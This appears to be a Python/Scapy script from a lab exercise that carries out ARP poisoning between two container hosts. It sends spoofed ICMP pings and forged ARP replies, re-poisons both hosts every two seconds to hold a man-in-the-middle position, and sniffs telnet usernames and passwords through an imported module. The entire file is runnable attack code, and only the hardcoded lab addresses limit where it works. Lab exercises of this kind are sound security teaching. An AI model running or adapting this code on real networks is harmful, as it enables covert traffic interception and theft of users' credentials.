#!/usr/bin/env python3
"""
ARP Poisoning and Man-in-the-Middle Attack
Help from GPT for formatting/wording and steps 3 & 4
"""

import os
import time
import sys
import threading
from scapy.all import Ether, IP, ICMP, ARP, TCP, Raw, sendp, sniff

# Import the telnet sniffer module
import telnet_sniffer as telnet_sniffer

# Update All these information if needed
HOST_A_IP = "10.9.0.5"
HOST_B_IP = "10.9.0.6"  
ATTACKER_IP = "10.9.0.1"
FAKE_IP = "10.9.0.7"  # Random IP for initial spoofing

# Use ifconfig
ATTACKER_MAC = "02:42:c3:35:c4:66"  
HOST_A_MAC = "02:42:0a:09:00:05"    
HOST_B_MAC = "02:42:0a:09:00:06"    

# Interface name 
INTERFACE = "br-7c9c1d65df3b" 

def get_mac_addresses():
    """Helper function to remind you to set MAC addresses"""
    print("\n[!] IMPORTANT: Update the MAC addresses in the script!")
    print("[*] On attacker container, run: ifconfig")
    print("[*] Look for interface starting with 'br-' and note its MAC")
    print("[*] On Host A, run: ifconfig and note its MAC")
    print("[*] On Host B, run: ifconfig and note its MAC")
    print("[*] Update the variables at the top of this script\n")
    
    if not all([ATTACKER_MAC, HOST_A_MAC, HOST_B_MAC, INTERFACE]):
        print("[ERROR] Please update MAC addresses and interface name first!")
        sys.exit(1)

def spoof_ping():
    """
    Send spoofed ICMP ping to Host A with fake IP but attacker's MAC
    This creates an incomplete ARP entry in Host A's table
    """
    print("\nSending spoofed ICMP ping to create ARP entry...")
    print(f"[*] Spoofing ping from {FAKE_IP} to {HOST_A_IP}")
    
    # Create Ethernet frame, IP packet, and ICMP ping
    eth = Ether(src=ATTACKER_MAC, dst=HOST_A_MAC)
    ip = IP(src=FAKE_IP, dst=HOST_A_IP)
    icmp = ICMP()
    
    packet = eth/ip/icmp
    sendp(packet, iface=INTERFACE, verbose=False)
    
    print(f"[+] Spoofed ping sent from {FAKE_IP}")
    print(f"[*] Check Host A with: arp -n")
    print(f"[*] You should see {FAKE_IP} with 'incomplete' MAC")

    time.sleep(1)

def spoof_arp_reply():
    """
    Send spoofed ARP reply to map fake IP to attacker's MAC in Host A's table
    """
    print("\nSending spoofed ARP reply...")
    print(f"[*] Spoofing ARP reply: {FAKE_IP} is at {ATTACKER_MAC}")

    arp_reply = ARP(
        op=2,  
        psrc=FAKE_IP,  
        hwsrc=ATTACKER_MAC,  
        pdst=HOST_A_IP,  
        hwdst=HOST_A_MAC  
    )
    
    eth = Ether(src=ATTACKER_MAC, dst=HOST_A_MAC)
    packet = eth/arp_reply

    sendp(packet, iface=INTERFACE, verbose=False)
    
    print(f"[+] ARP reply sent to {HOST_A_IP}")
    print(f"[*] Check Host A with: arp -n")
    print(f"[*] You should now see {FAKE_IP} mapped to {ATTACKER_MAC}")
    
    time.sleep(1)

def mitm_attack():
    """
    Create Man-in-the-Middle attack between Host A and Host B
    """
    print("\nSetting up Man-in-the-Middle attack...")
    print("[*] Creating ARP entries with spoofed pings...")
    
    # Ping from Host B to Host A 
    eth = Ether(src=ATTACKER_MAC, dst=HOST_A_MAC)
    ip = IP(src=HOST_B_IP, dst=HOST_A_IP)
    icmp = ICMP()
    packet = eth/ip/icmp
    sendp(packet, iface=INTERFACE, verbose=False)
    print(f"[+] Spoofed ping from {HOST_B_IP} to {HOST_A_IP}")
    
    time.sleep(1)
    
    # Ping from Host A to Host B
    eth = Ether(src=ATTACKER_MAC, dst=HOST_B_MAC)
    ip = IP(src=HOST_A_IP, dst=HOST_B_IP)
    icmp = ICMP()
    packet = eth/ip/icmp
    sendp(packet, iface=INTERFACE, verbose=False)
    print(f"[+] Spoofed ping from {HOST_A_IP} to {HOST_B_IP}")
    
    time.sleep(1)
    
    # Poison both ARP tables
    print("\n[*] Poisoning ARP tables...")

    arp_to_a = ARP(
        op=2,
        psrc=HOST_B_IP,  # Pretend to be Host B
        hwsrc=ATTACKER_MAC,  # But use attacker's MAC
        pdst=HOST_A_IP,
        hwdst=HOST_A_MAC
    )
    eth_to_a = Ether(src=ATTACKER_MAC, dst=HOST_A_MAC)
    packet_to_a = eth_to_a/arp_to_a
    
    arp_to_b = ARP(
        op=2,
        psrc=HOST_A_IP,  # Pretend to be Host A
        hwsrc=ATTACKER_MAC,  # But use attacker's MAC
        pdst=HOST_B_IP,
        hwdst=HOST_B_MAC
    )
    eth_to_b = Ether(src=ATTACKER_MAC, dst=HOST_B_MAC)
    packet_to_b = eth_to_b/arp_to_b

    sendp(packet_to_a, iface=INTERFACE, verbose=False)
    print(f"[+] Poisoned Host A: {HOST_B_IP} -> {ATTACKER_MAC}")
    
    sendp(packet_to_b, iface=INTERFACE, verbose=False)
    print(f"[+] Poisoned Host B: {HOST_A_IP} -> {ATTACKER_MAC}")
    
    print("\n[+] MiTM attack established!")
    print("[*] Host A thinks Host B is at attacker's MAC")
    print("[*] Host B thinks Host A is at attacker's MAC")
    print("[*] All traffic between them will go through attacker")
    
    # Keep poisoning active by resending every 2 seconds
    def keep_poisoning():
        while True:
            sendp(packet_to_a, iface=INTERFACE, verbose=False)
            sendp(packet_to_b, iface=INTERFACE, verbose=False)
            time.sleep(2)
    
    poison_thread = threading.Thread(target=keep_poisoning)
    poison_thread.daemon = True
    poison_thread.start()

def sniff_telnet():
    """
    Wrapper function that calls the telnet sniffer from q3.py module
    """
    print("\nStarting telnet credential sniffer...")
    print("[*] Waiting for telnet traffic on port 23...")
    print("[*] On Host A, run: telnet 10.9.0.6")
    print("[*] Enter username and password when prompted")
    print("\n[+] Captured packets will appear below. First line is the username and the Second line is the password (incorrect sets comes with pairs until the correct ones):\n")
    
    # Call the main function from the imported telnet_sniffer module
    telnet_sniffer.main()


def main():
    """Main function to run all steps"""
    print("=" * 60)
    print("ARP Poisoning and MiTM Attack - Educational Demo")
    print("WARNING: Only run in VM environment!")
    print("=" * 60)
    
    # Check if MAC addresses are set
    get_mac_addresses()
    
    while True:
        print("\nSelect an option:")
        print("1. Run Spoof ICMP ping")
        print("2. Run Spoof ARP reply")
        print("3. Run Setup MiTM attack")
        print("4. Run Sniff telnet credentials")
        print("5. Run all of the above in sequence")
        print("6. Exit")
        
        choice = input("\nEnter choice (1-6): ")
        
        if choice == '1':
            spoof_ping()
        elif choice == '2':
            spoof_arp_reply()
        elif choice == '3':
            mitm_attack()
        elif choice == '4':
            sniff_telnet()
        elif choice == '5':
            spoof_ping()
            input("\nPress Enter to continue to the next step...")
            spoof_arp_reply()
            input("\nPress Enter to continue to the next step...")
            mitm_attack()
            input("\nPress Enter to continue to the next step...")
            sniff_telnet()
        elif choice == '6':
            print("\nExiting...")
            break
        else:
            print("\nInvalid choice!")

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print("[ERROR] This script must be run as root!")
        print("Run with: sudo python3 arp_poison.py")
        sys.exit(1)
    
    main()